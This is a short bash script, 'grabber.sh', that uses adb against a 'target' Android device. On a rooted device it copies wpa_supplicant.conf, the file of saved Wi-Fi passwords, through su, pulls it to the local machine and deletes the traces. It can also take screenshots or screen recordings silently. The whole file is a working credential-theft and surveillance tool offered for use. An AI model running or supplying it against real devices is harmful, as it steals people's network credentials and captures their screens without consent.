#!/bin/bash

G="\033[1;34m[*] \033[0m"
E="\033[1;31m[-] \033[0m"

{
chr=$(adb which su)
} &> /dev/null

if [[ "$1" = "-h" || "$1" = "--help" ]]
then
echo -e "Usage: grabber.sh [option] <arguments>"
echo -e
echo -e "  -w, --wgrabber   <local_path>  Grab wpa_supplicant."
echo -e "  -s, --screenshot <local_path>  Take device screenshot."
echo -e "  -r, --screenrec  <local_path>  Record device screen."
echo -e "  -h, --help                     Give this help list."
exit

elif [[ "$1" = "-w" ]]; then
    if [[ $chr = "" ]]; then
        echo -e ""$E"Target device is not rooted!"
    else
        {
        adb shell su 0 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'
        adb pull /sdcard/wpa_supplicant.conf $2
        adb shell rm /sdcard/wpa_supplicant.conf
        } &> /dev/null
    fi
    exit

elif [[ "$1" = "-s" ]]; then
    {
    adb shell screencap /sdcard/screenshot.png
    adb pull /sdcard/screenshot.png $2
    adb shell rm /sdcard/screenshot.png
    } &> /dev/null
    exit
   
elif [[ "$1" = "-r" ]]; then
    {
    adb shell screenrecord /sdcard/screen.mp4
    adb pull /sdcard/screen.mp4 $2
    adb shell rm /sdcard/screen.mp4
    } &> /dev/null
    exit
fi

echo -e "Usage: grabber.sh [option] <arguments>"
echo -e
echo -e "  -w, --wgrabber   <local_path>  Grab wpa_supplicant."
echo -e "  -s, --screenshot <local_path>  Take device screenshot."
echo -e "  -r, --screenrec  <local_path>  Record device screen."
echo -e "  -h, --help                     Give this help list."
exit
